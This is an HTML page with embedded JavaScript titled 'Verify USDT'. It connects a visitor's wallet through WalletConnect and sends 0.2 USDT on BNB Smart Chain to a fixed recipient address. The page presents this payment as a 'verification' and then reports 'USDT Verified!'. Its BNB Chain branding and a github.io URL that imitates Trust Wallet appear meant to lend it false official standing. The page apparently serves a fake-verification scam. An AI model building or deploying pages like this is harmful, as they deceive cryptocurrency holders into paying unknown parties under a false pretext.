<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verify USDT • BNB Smart Chain</title>

<style>
*{box-sizing:border-box}

body{
  margin:0;
  font-family:Arial,sans-serif;
  background:#050505;
  color:#fff
}

.wrap{
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  padding:20px;
  background:radial-gradient(circle at 50% 15%,#242424,#0a0a0a 45%,#050505)
}

.card{
  width:100%;
  max-width:390px;
  border:1px solid #5c4d1b;
  border-radius:20px;
  background:#0c0c0c;
  padding:25px 21px;
  box-shadow:0 15px 45px #000
}

.top{
  display:flex;
  justify-content:space-between;
  align-items:center;
  margin-bottom:38px
}

.brand{
  font-weight:800;
  letter-spacing:1px
}

.tag{
  font-size:8px;
  color:#f5c400;
  border:1px solid #6e5b18;
  padding:5px 8px;
  border-radius:20px
}

.icon{
  width:70px;
  height:70px;
  margin:0 auto 22px;
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
  background:#151515;
  border:1px solid #66531a;
  font-size:32px
}

h1{
  text-align:center;
  font-size:30px;
  margin:0 0 10px
}

.sub{
  text-align:center;
  color:#999;
  font-size:13px;
  line-height:1.55;
  margin:0 0 25px
}

.box{
  border:1px solid #5c4d1b;
  border-radius:14px;
  background:#101010;
  padding:20px
}

.label{
  color:#caaa24;
  font-size:9px;
  letter-spacing:1px;
  margin-bottom:12px
}

.amount{
  font-size:34px;
  font-weight:800;
  text-align:center;
  margin:8px 0 18px
}

.network{
  text-align:center;
  color:#777;
  font-size:10px;
  margin-bottom:18px
}

.recipient{
  font-size:10px;
  color:#999;
  line-height:1.5;
  word-break:break-all;
  background:#161616;
  border-radius:8px;
  padding:10px;
  margin-bottom:16px
}

.wallet{
  font-size:11px;
  color:#aaa;
  background:#161616;
  border-radius:8px;
  padding:10px;
  margin-bottom:12px;
  word-break:break-all
}

button{
  width:100%;
  border:0;
  border-radius:9px;
  padding:15px;
  background:#f5c400;
  color:#111;
  font-size:15px;
  font-weight:800;
  margin-top:8px
}

button.secondary{
  background:#242424;
  color:#fff
}

button:disabled{
  opacity:.55
}

.status{
  text-align:center;
  font-size:12px;
  color:#aaa;
  line-height:1.5;
  margin-top:15px
}

.success{
  text-align:center;
  padding:12px;
  color:#c8d995;
  background:#11180c;
  border:1px solid #40501e;
  border-radius:9px;
  font-size:12px;
  line-height:1.5;
  margin-top:15px
}

.error{
  color:#ff9d9d
}

a{
  color:#f5c400;
  word-break:break-all
}

.footer{
  text-align:center;
  color:#555;
  font-size:9px;
  margin-top:22px
}
</style>
</head>

<body>

<div class="wrap">
  <div class="card">

    <div class="top">
      <div class="brand">◈ BNB CHAIN</div>
      <div class="tag">USDT VERIFICATION</div>
    </div>

    <div id="app"></div>

    <div class="footer">
      WalletConnect • Reown • BNB Smart Chain
    </div>

  </div>
</div>

<script type="module">

import { createAppKit }
  from "https://esm.sh/@reown/appkit";

import { WagmiAdapter }
  from "https://esm.sh/@reown/appkit-adapter-wagmi";

import { bsc }
  from "https://esm.sh/@reown/appkit/networks";


/* =========================
   CONFIG
========================= */

const projectId =
"ac959df0672aed01c939878f7870012a";

const PAYMENT_AMOUNT = "0.2";

const RECIPIENT =
"0xc1400749e127b83a8fD0022ccD1Fe8c27B06dec0";

const USDT =
"0x55d398326f99059fF775485246999027B3197955";

const USDT_DECIMALS = 18;

const EXPLORER =
"https://bscscan.com/";

const DAPP_URL =
"https://send-usdt-trustwallet-bnb-smartchain.github.io/Usdt-/";


/* =========================
   REOWN CONFIG
========================= */

const metadata = {
  name: "Verify USDT",
  description:
    "Transparent USDT payment on BNB Smart Chain",
  url: DAPP_URL,
  icons: []
};


const wagmiAdapter = new WagmiAdapter({
  projectId,
  networks: [bsc]
});


const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks: [bsc],
  projectId,
  metadata,
  features: {
    analytics: false
  },
  enableNetworkSwitch: true,
  enableReconnect: true,
  themeMode: "dark"
});


/* =========================
   APP
========================= */

const app =
document.getElementById("app");

let connected = false;


/* =========================
   HELPERS
========================= */

function escapeHtml(value){

  return String(value).replace(
    /[&<>"']/g,
    c => ({
      "&":"&amp;",
      "<":"&lt;",
      ">":"&gt;",
      '"':"&quot;",
      "'":"&#039;"
    }[c])
  );

}


function parseTokenAmount(value, decimals){

  const text =
    String(value).trim();

  if(
    !/^(?:0|[1-9]\d*)(?:\.\d+)?$/.test(text)
  ){
    throw new Error(
      "Invalid payment amount."
    );
  }

  const [
    whole,
    fraction=""
  ] = text.split(".");

  if(
    fraction.length > decimals
  ){
    throw new Error(
      "Payment amount has too many decimal places."
    );
  }

  return (
    BigInt(whole) *
    (10n ** BigInt(decimals))
  ) +
  BigInt(
    fraction.padEnd(decimals,"0") || "0"
  );

}


function shortAddress(a){

  return a
    ? a.slice(0,8) +
      "..." +
      a.slice(-6)
    : "";

}


/* =========================
   RENDER
========================= */

function render(){

  app.innerHTML = `

    <div class="icon">✓</div>

    <h1>Verify USDT</h1>

    <p class="sub">
      Connect your wallet with
      Reown/WalletConnect.
      The wallet will show the exact
      0.2 USDT transaction before
      you approve it.
    </p>

    <div class="box">

      <div class="label">
        USDT TO VERIFY / PAY
      </div>

      <div class="amount">
        ${PAYMENT_AMOUNT} USDT
      </div>

      <div class="network">
        Network: BNB Smart Chain
      </div>

      <div class="label">
        RECIPIENT
      </div>

      <div class="recipient">
        ${escapeHtml(RECIPIENT)}
      </div>

      <div id="walletBox"></div>

      <button id="connect">
        Connect Wallet
      </button>

      <button
        id="pay"
        class="secondary"
        disabled
      >
        Verify USDT •
        ${PAYMENT_AMOUNT} USDT
      </button>

      <div
        id="status"
        class="status">
      </div>

    </div>
  `;


  document.getElementById("connect")
    .onclick = () =>
      modal.open({
        view:"Connect",
        namespace:"eip155"
      });


  document.getElementById("pay")
    .onclick = pay;


  updateState();

}


/* =========================
   WALLET STATE
========================= */

function updateState(){

  const payButton =
    document.getElementById("pay");

  const connectButton =
    document.getElementById("connect");

  const walletBox =
    document.getElementById("walletBox");

  if(!payButton) return;


  connected =
    !!modal.getIsConnected();


  if(connected){

    const address =
      modal.getAddress?.() ||
      "Connected wallet";


    walletBox.innerHTML = `
      <div class="wallet">
        Connected:
        ${escapeHtml(
          shortAddress(address)
        )}
      </div>
    `;


    connectButton.textContent =
      "Wallet Connected";

    payButton.disabled = false;

  }

  else{

    walletBox.innerHTML = "";

    connectButton.textContent =
      "Connect Wallet";

    payButton.disabled = true;

  }

}


/* =========================
   WAIT FOR TRANSACTION
========================= */

async function waitForReceipt(
  provider,
  txHash,
  maxChecks=60,
  delayMs=2000
){

  for(
    let i=0;
    i<maxChecks;
    i++
  ){

    const receipt =
      await provider.request({
        method:
          "eth_getTransactionReceipt",
        params:[txHash]
      });


    if(receipt)
      return receipt;


    await new Promise(
      r => setTimeout(r,delayMs)
    );

  }


  throw new Error(
    "Transaction is still pending. Check BscScan."
  );

}


/* =========================
   PAYMENT
========================= */

async function pay(){

  const status =
    document.getElementById("status");

  const button =
    document.getElementById("pay");


  try{

    button.disabled = true;

    status.className =
      "status";

    status.textContent =
      "Preparing transaction...";


    const provider =
      modal.getWalletProvider();


    if(!provider){

      throw new Error(
        "Wallet is not connected. Tap Connect Wallet first."
      );

    }


    /* Check network */

    const chainId =
      await provider.request({
        method:"eth_chainId"
      });


    if(
      chainId.toLowerCase() !== "0x38"
    ){

      throw new Error(
        "Please switch your wallet to BNB Smart Chain."
      );

    }


    /* Get connected account */

    const accounts =
      await provider.request({
        method:"eth_accounts"
      });


    const from =
      accounts?.[0];


    if(!from){

      throw new Error(
        "No wallet account is connected."
      );

    }


    /* Convert 0.2 USDT
       using 18 decimals */

    const amountUnits =
      parseTokenAmount(
        PAYMENT_AMOUNT,
        USDT_DECIMALS
      );


    /* ERC20 transfer(address,uint256) */

    const toPadded =
      RECIPIENT
        .slice(2)
        .padStart(64,"0");


    const amountPadded =
      amountUnits
        .toString(16)
        .padStart(64,"0");


    const data =
      "0xa9059cbb" +
      toPadded +
      amountPadded;


    status.textContent =
      "Please approve the 0.2 USDT transaction in your wallet.";


    const txHash =
      await provider.request({

        method:
          "eth_sendTransaction",

        params:[{
          from,
          to:USDT,
          data
        }]

      });


    status.textContent =
      "Transaction submitted. Waiting for confirmation...";


    const receipt =
      await waitForReceipt(
        provider,
        txHash
      );


    if(
      !receipt.status ||
      receipt.status.toLowerCase() !== "0x1"
    ){

      throw new Error(
        "The blockchain transaction failed/reverted."
      );

    }


    /* =========================
       SUCCESS
    ========================= */

    app.innerHTML = `

      <div class="icon">✓</div>

      <h1>USDT Verified!</h1>

      <p class="sub">
        ${escapeHtml(PAYMENT_AMOUNT)}
        USDT payment was confirmed
        on BNB Smart Chain.
      </p>

      <div class="box">

        <div class="success">
          ✓ USDT verification successfully.
        </div>

        <div
          class="label"
          style="margin-top:16px"
        >
          TRANSACTION HASH
        </div>

        <div class="recipient">
          ${escapeHtml(txHash)}
        </div>

        <a
          href="${EXPLORER}tx/${encodeURIComponent(txHash)}"
          target="_blank"
          rel="noopener noreferrer"
        >
          View verified transaction on BscScan
        </a>

        <button
          id="again"
          class="secondary"
        >
          Done
        </button>

      </div>

    `;


    document.getElementById("again")
      .onclick = render;

  }


  catch(e){

    status.textContent =
      e?.message ||
      "Payment cancelled or failed.";

    status.className =
      "status error";

    button.disabled =
      !modal.getIsConnected();

  }

}


/* =========================
   EVENTS
========================= */

modal.subscribeState(
  () => updateState()
);

modal.subscribeEvents(
  () => updateState()
);


/* START */

render();

</script>

</body>
</html>
